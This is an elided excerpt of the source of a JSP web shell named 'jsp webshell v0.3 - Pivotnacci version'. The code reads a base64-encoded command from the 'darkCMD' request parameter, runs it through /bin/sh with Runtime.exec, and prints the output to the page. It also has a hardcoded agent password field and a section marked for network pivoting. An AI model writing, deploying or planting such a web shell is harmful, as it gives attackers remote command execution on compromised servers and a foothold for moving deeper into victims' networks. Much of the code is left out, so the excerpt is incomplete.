...
<%!
   final String APP_NAME="jsp webshell v0.3 - Pivotnacci version";
%>
...
<%!
  ...
  public class Handler {
      ...
      private final String AGENT_PASSWORD = "PASSWORD";
...
<%
    ...
    final String LPWD=application.getRealPath("/");

    String param = request.getParameter("uuid");

    if ( (param != null) && (!param.trim().isEmpty()) && (param.equalsIgnoreCase("form")) ) {
        
        out.println("LPWD: " + application.getRealPath("/") + "<br>");
   
        String enc_command = request.getParameter("darkCMD");
        byte[] dec_bytes = Base64.getDecoder().decode(enc_command);
        String command = new String(dec_bytes);
        
        String output = "";
        //String[] COMMAND_INTERPRETER = {"cmd", "/C"}; // Dos,Windows
        String[] COMMAND_INTERPRETER = {"/bin/sh","-c"}; // UNIX 
        ...
        comm[2] = command;
            ...
            if(command != null) {
                String s = null;
                try {
                    Process p = Runtime.getRuntime().exec(comm,null,null);
        ...
        out.println("Executed command: " + command + "<br>");
        out.println("Command output:" + "<br>");
        out.println(output);
        
        }
// PIVOTING THINGS - Pivotnacci      
    else{          
